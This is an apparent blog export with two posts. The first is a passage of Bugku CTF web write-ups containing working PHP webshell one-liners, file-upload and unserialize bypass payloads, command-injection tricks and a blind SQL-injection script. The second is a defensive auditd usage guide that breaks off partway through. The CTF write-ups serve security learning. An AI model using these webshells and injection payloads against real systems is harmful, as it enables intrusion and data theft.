<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(!$_GET[&#39;id&#39;]) &#x2F;&#x2F;id要求不为0</span><br><span class="line">&#123;</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)   &#x2F;&#x2F;id要求弱等于0</span><br><span class="line">&#123;</span><br><span class="line">	$flag &#x3D; &quot;flag&#123;***********&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>审计源码，传递三个参数id,a,b,要满足a变量不包含.符号，a的值为”bugku is a nice plateform!” ，id的值要求非0，又要弱等于0，b的长度大于5，还要满足字符串 1114 要与字符串 111 连接变量 b 的第一个字符构成的正则表达式匹配，变量 b 的第一个字符不等于整型数 4。file_get_contents()函数中可以使用php://input,因此可以利用伪协议、弱相等、eregi截断漏洞构造payload为/hello.php?id=0a&amp;a=php://input&amp;b=%00abcde，并在body中传入”bugku is a nice plateform!”,得到flag{ff7c252041021ba54808125cc93d1d06}</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210123172757.png" alt="burpsuite改包"></p>
<p>ps：总结两个个php函数，stripos()，和eregi()以及其绕过姿势</p>
<ul>
<li>stripos(string,find,start):其中string，hind为必填，start为选填，作用为查找find再string中第一次出现的位置，start为规定开始搜索的位置，如stripos(“You love php, I love php too!”,”PHP”)的返回值为9；</li>
<li>eregi(a,string)：作用为判度string中是否存在a，且不区分大小写，如eregi(‘abc’,’b’)返回True；</li>
<li>eregi绕过姿势：eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据，在url中可以用%00空字符的方式进行截断；</li>
</ul>
<hr>
<h2 id="Web-22"><a href="#Web-22" class="headerlink" title="Web 22"></a>Web 22</h2><p><strong>tip: 送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</strong></p>
<p>将提示中的代码还原 <code>assert($_GET[&#39;s&#39;])</code> ,可知要通过get请求传递一个参数s，并进行assert操作，可以利用scandir函数或者system函数来获取flag：</p>
<ul>
<li>方法一：利用scandir函数和assert函数获取当前目录下的所有文件夹和文件，构造payload为?s=print_r(scandir(‘./‘))，</li>
<li>方法二：利用system函数和assert函数获取当前目录下的所有文件夹和文件，构造payload为?s=system(‘ls’)；</li>
</ul>
<p>得到flag文件后直接在url访问，得到flag{fc7cad1203f0a19783eee71ae8e43379}</p>
<p>ps: scandir()函数作用为列出指定目录中的所有文件和目录；system()函数用于执行系统命令；</p>
<hr>
<h2 id="xxx二手交易市场"><a href="#xxx二手交易市场" class="headerlink" title="xxx二手交易市场"></a>xxx二手交易市场</h2><p><strong>tip: 本人现实碰到的题目，无提示勿问</strong></p>
<p>这道题的注册功能已经修复过了，最初版本的注册功能是无效的，还需要猜测账号和密码(123456)。。。</p>
<p>注册一个账号登录，在头像位置存在文件上传漏洞，上传一个图片通过burpsuite抓包，数据以base64编码的数据流形式传输，将data:image/jpeg修改为data:image/php，文件上传成功且后缀变为php，可以通过data属性控制文件后缀，然后将一句话木马进行base64编码，替换图片部分的数据流，<code>&lt;?php @eval($_POST[cmd]); ?&gt;</code>的base64编码为<code>PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Pg==</code>，因此构造payload为image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Pg==，上传webshell后用蚁剑连接，在当前目录下得到flag{06add122126c9092268739112c89d62d}</p>
<hr>
<h2 id="冬至红包"><a href="#冬至红包" class="headerlink" title="冬至红包"></a>冬至红包</h2><p><strong>tip: 闪电十六鞭</strong></p>
<p>审计源码，get传递的flag参数需要满足以下条件：</p>
<ul>
<li>flag变量长度等于$exam的长度，长度为49</li>
<li>flag变量不能包含` , “ , . , \ , ( , ) , [ , ] , _ , flag , echo , print , require , include , die , exit ;</li>
<li>eval($_GET[‘flag’]) === sha1($flag)</li>
</ul>
<p>其中第三点等于sha1可以利用短标签绕过判断，直接利用eval输出$flag变量的值，构造payload绕过对flag字符串的过滤，payload为<code>?flag=$a=&#39;blag&#39;;$a&#123;0&#125;=&#39;f&#39;;?&gt;11111111111111111;&lt;?=$$a;?&gt;</code>,得到flag{78062956} ；其中?&gt;用于闭合开头的&lt;?php 标记，111…111是用来填充长度的，</p>
<p>ps: 总结一下短标签的用法。<code>&lt;?=$var?&gt;</code><br>和<code>&lt;?php echo $var; ?&gt;</code>的效果是一样的，用于输出某个变量；</p>
<hr>
<h2 id="Web-23"><a href="#Web-23" class="headerlink" title="Web 23"></a>Web 23</h2><p><strong>tip: 字符？正则？</strong></p>
<p>要求get请求的参数id满足正则匹配<code>preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match)</code>，构造payload为?id=keykeyaaaakey:/a/keya:得到flag{eced261c98e527123293bc4c3c168c95}</p>
<p>ps1:trim()函数：移除字符串两侧的空白字符或其他预定义字符。</p>
<p>ps2:正则规则</p>
<ul>
<li>‘/xxxx/i’：两端的两个斜杠为开始和结束标记，i表示不区分大小写；</li>
<li>. ：匹配任意一个字符(注意只能时一个字符)</li>
<li>.* : 匹配任意多个任意字符(任意多个也可以是0个)</li>
<li>{m,n} : 匹配m~n个任意字符(包含m，但不包含n)</li>
<li>[a-z] : 匹配一个a-z之间的任意一个字符</li>
<li>[[:punct:]]: 匹配一个特殊字符，如:,@,:等</li>
</ul>
<hr>
<h2 id="Web-24"><a href="#Web-24" class="headerlink" title="Web 24"></a>Web 24</h2><p><strong>tip: 前女友</strong></p>
<p>查看页面源代码，发现链接两个字会跳转到提示页面，进入提示页面后进行代码审计</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;</span><br><span class="line">    $v1 &#x3D; $_GET[&#39;v1&#39;];</span><br><span class="line">    $v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class="line">    $v3 &#x3D; $_GET[&#39;v3&#39;];</span><br><span class="line">    if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>md5绕过姿势在Web16已经介绍了，同时利用strcmp函数的漏洞，构造payload为?v1[]=1&amp;v2[]=2&amp;v3[]=1，即可得到flag{1f8906753838d5dd46af3f343d5b43f2}</p>
<p>ps：strcmp ( string $str1 , string $str2 )介绍：</p>
<ul>
<li>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。在5.3之前的php中，当这个函数接受到了不符合的类型，显示了报错的警告信息后，将return 0 ，也就是虽然报了错，但却判定其相等了。因此可以利用数组绕过strcmp的判断。</li>
</ul>
<hr>
<h2 id="Web-25"><a href="#Web-25" class="headerlink" title="Web 25"></a>Web 25</h2><p><strong>tip: SQL约束攻击</strong></p>
<p>在谈论这种攻击手法之前，首先我们需要了解几个关键知识点。</p>
<ul>
<li><p>在SQL中执行insert命令时，会受到字段长度的约束。例如以下，设置了name字段最大长度为8，当输入了长度大于8的字符串时如vampire123，insert命令会只截取前8位字符，最终插入数据位vampire1，如下图所示(经本地测试，这种情况存在于mysql 5.5.35版本，在mysql 5.7.23版本会报错)<br><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210126085705.png" alt="20210126085705"></p>
</li>
<li><p>在SQL中执SELECT处理时，字符串末尾的空格会被忽略。换句话说select * from users where name=”abc”等同于where name=”abc &nbsp;&nbsp;&nbsp;”；如下所示，在执行select查询时，返回了vampire1的结果，忽略了后面的空格，<br><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210126090046.png" alt="20210126090046"></p>
</li>
</ul>
<p>这个题利用了这两个关键点，先通过注册，利用空格注册一个admin账户，如账号为”admin &nbsp;&nbsp;&nbsp;1”；(其中admin和1之间包含若干个空格))，再通过账号密码登录，即可获得flag{f2b6e02fcb3c729900f8255eb2777138}</p>
<hr>
<h2 id="Web-29"><a href="#Web-29" class="headerlink" title="Web 29"></a>Web 29</h2><p><strong>tip: 各种绕过</strong></p>
<p>sha1绕过可以利用数组绕过强相等判断，和md5数组绕过方法相同，因此可构造payload为?id=margin&amp;uname[]=1，同时post请求passwd[]=2，即可得到flag{9cab7b5704ec4d45953c039c22ff4edd}</p>
<hr>
<h2 id="Web-34"><a href="#Web-34" class="headerlink" title="Web 34"></a>Web 34</h2><p><strong>tip: hint:文件包含</strong></p>
<p>查看页面源代码，发现提示访问upload.php，经测试能够图片马，结合提示图片马+文件包含getshell，经测试&lt;?php和?&gt;被过滤了，使用如下payload为<code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[cmd])&lt;/script&gt;</code>成功上传webshell，蚁剑连接在根目录得到flag{1039c22c0a08a1523629a64d2b1382ea}</p>
<hr>
<h2 id="Web-32"><a href="#Web-32" class="headerlink" title="Web 32"></a>Web 32</h2><p><strong>tip: 求getshell</strong></p>
<p>这道题有三道题需要绕过:</p>
<ul>
<li>multipart/form-data: 后端会判断是否存在这个字段，如果存在则继续判断后缀，可用大写绕过如Multipart/form-data(个人猜测这一步是模仿防火墙的检测功能)</li>
<li>后缀白名单：经测试php4在白名单里，可绕过</li>
<li>type检测：将Content-Type改为image/jpeg，可绕过</li>
</ul>
<p>以上三处绕过后可成功上传php4文件，蚁剑连接，在根目录得到flag{875905e02b46bb7322456dafa67b82d0}，具体的后端检测函数可以蚁剑连接后查看源代码分析</p>
<hr>
<h2 id="安慰奖"><a href="#安慰奖" class="headerlink" title="安慰奖"></a>安慰奖</h2><p><strong>tip: flag{}</strong></p>
<p>根据提示，下载index.php.bak审计源码，需要进行反序列化操作，且绕过wake_up()和cmd过滤，因此构造<br>payload为?code=O:3:”ctf”:3:{s:11:”%00*%00username”;s:5:”admin”;s:6:”%00*%00cmd”;s:12:”tac%20flag.php”;}，即可得到flag{Unser1alize_and_2CE_Add}</p>
<p>ps: 介绍三个点，第一个是wake_up绕过，第二个是public，protect和private在序列化中的区别，第三个是读文件的命令：</p>
<ul>
<li>当成员属性数目大于实际数目时可绕过wakeup方法，如上述payload中”ctf”:3，实际上类ctf中的属性只有两个，而payload中设为3，即可绕过wake_up；</li>
<li>Public属性序列化后格式:成员变量名；Private属性序列化后格式:%00类名%00成员变量名；Protected属性序列化后的格式:%00*%00成员变量名</li>
<li>linux中读取文件的命令：cat | tac | more | less | head | tail |nl 等</li>
</ul>
<hr>
<h2 id="Web-36"><a href="#Web-36" class="headerlink" title="Web 36"></a>Web 36</h2><p><strong>tip: 全都过滤了绝望吗?</strong></p>
<p>登录后先根据<br><a href="https://wxt123.top/downloads/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/sqlfuzz.txt">sql-fuzz字典</a>和burpsuite的返回长度进行fuzz测试看过滤了哪些字符串，经测试逗号被过滤了，但异或符号 ^ 还可以使用，当uname输入非admin时，返回值都为username error，当uname输入admin时，返回值为password error，说明用户名为amdin，接下来开始利用异或注入：</p>
<ul>
<li><p>判断密码长度：<code>uname=admin&#39;^(length(passwd)=32)^&#39;</code></p>
<p>最后的 ‘ 用来闭合原本的右括号，这个结果返回empty，因此页面显示username error；分析返回结果时需要注意sql运算符的优先级， ^ &gt; = ，所以先进行异或运算，最后进行比较运算，且字符串与数字做异或运算时，会先进行类型转换，如’admin’^1相当于0^1；此题中，’admin’相当于0，(length(passwd)=32)相当于1，’’相当于0，所以0^1^0为1，最后进行uname的比较运算，即在数据库中匹配uname=1的数据，而数据库中的uname为’admin’，在进行’admin’=1比较时，’admin’先转换成整型0，0=1为false，所以返回empty。</p>
<p>同理，当payload中密码长度修改为31时，异或运算相当于0^0^0，结果为0，在做比较运算时，uname=0，而’admin’转化为0，0=0为true，则查询成功，uname绕过了，因此页面显示passwd error；故可以通过这一点判断密码长度为32；猜测密码为md5密文；</p>
</li>
<li><p>判断密码每一位字符：<code>uname=admin&#39;^(ascii(substr((passwd)from(1))=52)^&#39;</code><br>用于判读密码第一位的字符(注意mysql和php不同，substr的第一位不是从0开始，而是1)；substr((passwd)from(1))利用了括号绕过逗号，相当于substr(passwd,1)。和判断密码长度的原理相同，当密码第一位判断正确时，返回username error，错误时返回passwd error，根据返回结果的不同爆破出32位密码，脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;114.67.246.176:10945&#x2F;login.php&#39;</span><br><span class="line">mima&#x3D;&#39;&#39;</span><br><span class="line">r&#x3D;requests.session()</span><br><span class="line">for i in range(1,33):</span><br><span class="line">  for j in range(48,123):</span><br><span class="line">    data&#x3D;&#123;</span><br><span class="line">      &#39;uname&#39;:f&quot;admin&#39;^(ascii(substr((passwd)from(&#123;i&#125;)))&#x3D;&#123;j&#125;)^&#39;&quot;,</span><br><span class="line">      &#39;passwd&#39;:&#39;123&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    resp&#x3D;r.post(url,data&#x3D;data).text</span><br><span class="line">    if &#39;username&#39; in resp:</span><br><span class="line">      print(f&quot;第&#123;i&#125;个：&#123;chr(j)&#125;&quot;)</span><br><span class="line">      mima+&#x3D;chr(j)</span><br><span class="line">print(mima)</span><br></pre></td></tr></table></figure>
<p>得到32位密文后，放入somd5解密，得到密码bugkuctf，利用账号admin和密码bugku登录后，进入新的页面，该页面具有系统命令执行功能，但过滤部分字符串，获得flag的payload有很多，下面列举几个并作说明：</p>
<ul>
<li>env :用于输出系统环境变量，这道题中系统环境变量中有flag；</li>
<li>{echo,$FLAG}：也是输出系统环境变量，但是只输出$FLAG一个变量</li>
<li>{cat,/flag}：绕过空格限制，读取根目录下flag文件；</li>
<li>cat&lt;/flag：绕过空格限制，</li>
<li>cat&lt;&gt;/flag：绕过空格限制；</li>
<li>a=$‘\x20/flag’&amp;&amp;cat$a：\x20转换为字符串就是空格;</li>
</ul>
</li>
</ul>
<p>还有两个绕过空格的方法，但是本题中给过滤掉了：</p>
<ul>
<li>cat${IFS}/flag </li>
<li>cat$IFS$9/flag</li>
</ul>
<p>通过以上即可得到flag{a76e888fdf053f9d20a76eab8dcf1a99}</p>
<hr>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>**tip: **</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210127002332.png" alt="20210127002332"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>audit+camflow使用记录</title>
    <url>/2021/02/01/audit+camflow%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="auditd"><a href="#auditd" class="headerlink" title="auditd"></a>auditd</h1><ul>
<li>实验系统：ubuntu 20.04</li>
<li>auditctl命令：用于制定规则</li>
<li>ausearch命令: 用于查看日志</li>
</ul>
<hr>
<a id="more"></a>
<h2 id="监控文件"><a href="#监控文件" class="headerlink" title="监控文件"></a>监控文件</h2><p>添加规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo auditctl -w &#x2F;home&#x2F;supervampire&#x2F;passwd -p rwxa</span><br><span class="line">-w:指定要监控的路径，如passwd的文件路径</span><br><span class="line">-p:指定监控属性</span><br></pre></td></tr></table></figure>
<p><strong>执行查看passwd文件命令</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;supervampire&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>查看有关/home/supervampire/passwd的监控日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ausearch -i -f &#x2F;home&#x2F;supervampire&#x2F;passwd</span><br><span class="line">-f:设置审计对象</span><br><span class="line">-i:对日志进行解释，不然日志文件内容包含16进制，不方便审计</span><br></pre></td></tr></table></figure>
<p>查看文件对应的日志内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 10:03:36.061:128) : proctitle&#x3D;cat &#x2F;home&#x2F;supervampire&#x2F;passwd </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 10:03:36.061:128) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;passwd inode&#x3D;394571 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年01月31日 10:03:36.061:128) : cwd&#x3D;&#x2F;home&#x2F;supervampire </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 10:03:36.061:128) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7ffeb305c205 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;2790 pid&#x3D;5719 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;cat exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;cat subj&#x3D;unconfined key&#x3D;(null)</span><br><span class="line"></span><br><span class="line">2021年01月31日 10:03:36.061:128表示时间和事件id，其中128为事件id</span><br><span class="line">proctitle: 进程名</span><br><span class="line">time : 审计时间</span><br><span class="line">name : 审计对象</span><br><span class="line">pid : 进程号</span><br><span class="line">ppid : 父进程号</span><br><span class="line">cwd : 当前路径</span><br><span class="line">syscall : 相关的系统调用</span><br><span class="line">a0,a1,a2,a3 ：系统调用的前四个参数</span><br><span class="line">auid : 审计用户ID</span><br><span class="line">uid 和 gid : 访问文件的用户ID和用户组ID</span><br><span class="line">ses: 对应进程的session ID</span><br><span class="line">comm : 用户访问文件的命令</span><br><span class="line">exe : 上面命令的可执行文件路径</span><br></pre></td></tr></table></figure>
<p>上述日志表明supervampire用户在/home/supervampire目录下，使用/usr/bin/cat可执行文件执行了cat /home/supervampire/passwd命令</p>
<p><strong>执行写入文件命令</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed -e 2a\balabala &#x2F;home&#x2F;supervampire&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>写入文件对应的日志内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 15:00:42.302:543) : proctitle&#x3D;sed -e 2abalabala &#x2F;home&#x2F;supervampire&#x2F;passwd </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 15:00:42.302:543) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;passwd inode&#x3D;394572 dev&#x3D;08:05 mode&#x3D;file,644 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年01月31日 15:00:42.302:543) : cwd&#x3D;&#x2F;home&#x2F;supervampire </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 15:00:42.302:543) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7ffccb797724 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;6792 pid&#x3D;9240 auid&#x3D;supervampire uid&#x3D;root gid&#x3D;root euid&#x3D;root suid&#x3D;root fsuid&#x3D;root egid&#x3D;root sgid&#x3D;root fsgid&#x3D;root tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;sed exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;sed subj&#x3D;unconfined key&#x3D;(null)</span><br></pre></td></tr></table></figure>
<p>上述日志表明root用户在/home/supervampire目录下，使用/usr/bin/sed可执行文件执行了sed -e 2abalabala /home/supervampire/passwd命令，向文件中插入数据”balabala”</p>
<p><strong>执行删除文件命令</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;home&#x2F;supervampire&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>删除文件对应的日志内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : proctitle&#x3D;rm &#x2F;home&#x2F;supervampire&#x2F;passwd </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : item&#x3D;1 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;passwd inode&#x3D;394584 dev&#x3D;08:05 mode&#x3D;file,644 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;DELETE cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F; inode&#x3D;404570 dev&#x3D;08:05 mode&#x3D;dir,755 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;PARENT cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : cwd&#x3D;&#x2F;test </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : arch&#x3D;x86_64 syscall&#x3D;unlinkat success&#x3D;yes exit&#x3D;0 a0&#x3D;0xffffff9c a1&#x3D;0x55e507fa85a0 a2&#x3D;0x0 a3&#x3D;0x0 items&#x3D;2 ppid&#x3D;6792 pid&#x3D;7713 auid&#x3D;supervampire uid&#x3D;root gid&#x3D;root euid&#x3D;root suid&#x3D;root fsuid&#x3D;root egid&#x3D;root sgid&#x3D;root fsgid&#x3D;root tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;rm exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;rm subj&#x3D;unconfined key&#x3D;(null)</span><br></pre></td></tr></table></figure>
<p>上述日志表明root用户在/test目录下，使用/usr/bin/rm可执行文件执行了rm /home/supervampire/passwd命令，且type=PATH中，item1的nametype为DELETE；</p>
<hr>
<h2 id="监控网络"><a href="#监控网络" class="headerlink" title="监控网络"></a>监控网络</h2><p>添加规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo auditctl -a always,exit -F arch&#x3D;b64 -S connect</span><br><span class="line">#定义一个规则，当每次使用系统调用connect，并且为64位架构，记录审计日志</span><br></pre></td></tr></table></figure>
<p><strong>执行curl命令</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
<p>在var/log/audit/audit.log中搜索curl关键字，定位到事件id为550，执行<code>sudo ausearch -i -a 550</code>来审计事件550对应的curl日志内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 16:17:24.721:550) : proctitle&#x3D;curl https:&#x2F;&#x2F;www.baidu.com </span><br><span class="line">type&#x3D;SOCKADDR msg&#x3D;audit(2021年01月31日 16:17:24.721:550) : saddr&#x3D;&#123; fam&#x3D;inet laddr&#x3D;112.80.248.76 lport&#x3D;443 &#125; </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 16:17:24.721:550) : arch&#x3D;x86_64 syscall&#x3D;connect success&#x3D;no exit&#x3D;EINPROGRESS(操作现在正在进行) a0&#x3D;0x5 a1&#x3D;0x7fff90c26d00 a2&#x3D;0x10 a3&#x3D;0x2 items&#x3D;0 ppid&#x3D;2801 pid&#x3D;3220 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;curl exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;curl subj&#x3D;unconfined key&#x3D;(null)</span><br></pre></td></tr></table></figure>
<p>上述日志表明supervampire用户，使用/usr/bin/curl可执行文件执行了curl <a href="https://www.baidu.com/">https://www.baidu.com</a> 命令，并通过saddr看出请求的ip地址112.80.248.76；</p>
<p><strong>使用firefox请求 baidu.com</strong></p>
<p>根据关键字firefox定位到日志位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 16:35:44.888:1643) : proctitle&#x3D;&#x2F;usr&#x2F;lib&#x2F;firefox&#x2F;firefox -new-window </span><br><span class="line">type&#x3D;SOCKADDR msg&#x3D;audit(2021年01月31日 16:35:44.888:1643) : saddr&#x3D;&#123; fam&#x3D;inet laddr&#x3D;112.80.248.75 lport&#x3D;443 &#125; </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 16:35:44.888:1643) : arch&#x3D;x86_64 syscall&#x3D;connect success&#x3D;no exit&#x3D;EINPROGRESS(操作现在正在进行) a0&#x3D;0x6a a1&#x3D;0x7f96ba361740 a2&#x3D;0x10 a3&#x3D;0x18 items&#x3D;0 ppid&#x3D;1870 pid&#x3D;3291 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;Socket Thread exe&#x3D;&#x2F;usr&#x2F;lib&#x2F;firefox&#x2F;firefox subj&#x3D;unconfined key&#x3D;(null) </span><br></pre></td></tr></table></figure>
<p>上述日志表明supervampire用户，使用/usr/lib/firefox/firefox可执行文件执行了/usr/lib/firefox/firefox -new-window，并通过saddr看出请求的ip地址，查询ip解析为百度域名；</p>
<hr>
<h2 id="监控进程"><a href="#监控进程" class="headerlink" title="监控进程"></a>监控进程</h2><p>添加规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo auditctl -a always,exit -F arch&#x3D;b64 -S kill -F key&#x3D;kill_signals</span><br><span class="line">sudo auditctl -a always,exit -F arch&#x3D;b64 -S execve -F key&#x3D;exe_cmd</span><br><span class="line">#当使用kill和execve时，记入日志中</span><br></pre></td></tr></table></figure>
<p>启动一个python进程，然后执行 kill.sh文件，kill.sh内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">ps -ef |grep app.py |awk &#39;&#123;print $2&#125;&#39;|xargs kill -9</span><br></pre></td></tr></table></figure>
<p>通过<code>sudo ausearch -i -k exe_cmd</code>查看日志相关内容，其中key表示规则中定义的关键字，ausearch根据关键字搜索：</p>
